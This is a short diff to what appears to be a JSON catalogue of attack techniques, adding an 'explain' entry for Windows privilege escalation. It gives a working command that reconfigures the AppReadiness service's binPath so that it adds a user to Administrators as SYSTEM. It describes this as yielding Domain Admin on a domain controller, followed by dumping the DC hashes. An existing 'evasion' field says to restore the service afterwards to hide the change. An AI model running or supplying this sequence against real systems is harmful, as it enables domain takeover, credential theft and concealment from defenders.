@@ -100,5 +100,6 @@
       "MITRE T1078.002"
     ],
     "evasion": "Modify the service binPath, trigger once, then restore the original service configuration."
-  }
+  },
+  "explain": "Abuses Server Operators (can reconfigure SYSTEM services) to run a command as SYSTEM:\n  sc config AppReadiness   reconfigure this service\n  binPath= \"cmd /c net localgroup Administrators <user> /add\"   point its executable at a command that adds you to Administrators\nStart the service to execute it as SYSTEM. On a DC this yields Domain Admin, after which you dump the DC hashes."
 }
